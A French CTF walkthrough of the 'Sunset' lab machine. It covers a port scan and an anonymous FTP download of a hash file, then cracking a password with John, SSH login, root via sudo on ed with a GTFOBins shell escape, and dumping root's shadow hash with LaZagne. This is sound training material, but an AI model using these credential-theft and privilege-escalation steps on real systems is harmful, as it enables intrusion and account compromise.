# Sunset

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo ./massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.254
[i] Rate: 1000
 
🔥 Masscan 192.168.56.254...100%
👁️ Nmap 192.168.56.254...100%
 
[+] 22/tcp open
[+] 21/tcp open
 
==========================================================
|                         📑 Rapports                    |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.254-tcp.html     |
==========================================================
```

&nbsp;

<span style="color: #dddddd;">🖥️</span> **Netexec**

Regardons ce qui se trouve sur le `FTP`

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $nxc ftp 192.168.56.254 -u '' -p '' --ls
FTP         192.168.56.254  21     192.168.56.254   [*] Banner: pyftpdlib 1.5.5 ready.
FTP         192.168.56.254  21     192.168.56.254   [+] : - Anonymous Login!
FTP         192.168.56.254  21     192.168.56.254   [*] Directory Listing
FTP         192.168.56.254  21     192.168.56.254   -rw-r--r--   1 root     root         1062 Jul 29  2019 backup
┌─[m0rph3u5@parrot]─[~]
└──╼ $nxc ftp 192.168.56.254 -u '' -p '' --get backup
FTP         192.168.56.254  21     192.168.56.254   [*] Banner: pyftpdlib 1.5.5 ready.
FTP         192.168.56.254  21     192.168.56.254   [+] : - Anonymous Login!
FTP         192.168.56.254  21     192.168.56.254   [+] Downloaded: backup
```

&nbsp;

Allons voir ce que contient le fichier

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $cat backup
CREDENTIALS:                                                                                                                                                                                                       
office:$6$$9ZYTy.VI0M7cG9tVcPl.QZZi2XHOUZ9hLsiCr/avWTajSPHqws7.75I9ZjP4HwLN3Gvio5To4gjBdeDGzhq.X.                                                                                                                  
datacenter:$6$$3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/                                                                                                              
sky:$6$$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0                                                                                                                     
sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/
space:$6$$4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/
```

&nbsp;

<span style="color: #dddddd;">🧨</span> **JohnTheRipper**

Crack des hash trouver

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $john backup --wordlist=Desktop/rockyou.txt --format=sha512crypt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cheer14          (sunset)     
1g 0:00:00:04 DONE (2025-09-23 21:16) 0.2500g/s 3520p/s 3520c/s 3520C/s ilovemydog..hello13
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

&nbsp;

<span style="color: #dddddd;">🖥️</span> **NetExec**

Test du login

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $nxc ssh 192.168.56.254 -u sunset -p cheer14
SSH         192.168.56.254  22     192.168.56.254   [*] SSH-2.0-OpenSSH_7.9p1 Debian-10
SSH         192.168.56.254  22     192.168.56.254   [+] sunset:cheer14 (Pwn3d!) Linux - Shell access!
```

&nbsp;

🛰️ **fullEx**

Élévation de privilège

```
sunset@sunset:/tmp/fullEx$ bash fullEx.sh -perm
sunset@sunset:/tmp/fullEx$ ./fullEx.sh -LinPeas
   
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for sunset on sunset:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sunset may run the following commands on sunset:
    (root) NOPASSWD: /usr/bin/ed

```

&nbsp;

<span style="color: #dddddd;">⚙️</span> GTFobin

https://gtfobins.github.io/gtfobins/ed/#sudo

```
sunset@sunset:/tmp/fullEx$ sudo ed
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

&nbsp;

🛰️ **fullEx**

Cherchons des mot de passe sur la machine

```
root@sunset:/tmp/fullEx# ./fullEx.sh -LaZagne 

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: sunset
Hash: $6$rmbgK3bT0XunUYV5$HMLAnRSCVNCoXR7wsZpJkCOukKjBVpTiQW35blyvaEOROmSrkiS7nRKHt9XPWUtWW5Z0Q7GS397YusLHMBlP41:18105:0:99999:7:::

[+] Hash found !!!
Login: root
Hash: $6$YXrh6Xi3Ap9I9fz.$XOex..0KuojOQ4Zm6Q1eg6unA6TXoNvf9VEPTXn6BvlyEV5V9scRtLcbwqAROpnEGPASnFjcuSV7ME0o0/jEp/:18105:0:99999:7:::


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 4.142789363861084

```

&nbsp;

Identifiant trouver

| Users | Passwords |
| --- | --- |
| sunset | cheer14 |
